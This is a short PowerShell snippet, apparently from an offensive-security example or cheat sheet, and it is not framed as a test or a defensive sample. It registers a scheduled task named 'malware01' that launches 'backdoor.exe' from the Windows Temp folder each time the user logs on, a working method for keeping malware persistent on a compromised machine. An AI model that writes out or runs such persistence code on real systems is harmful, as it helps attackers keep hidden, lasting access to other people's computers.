$Sta = New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\backdoor.exe"
$Stt = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
Register-ScheduledTask malware01 -Action $Sta -Trigger $Stt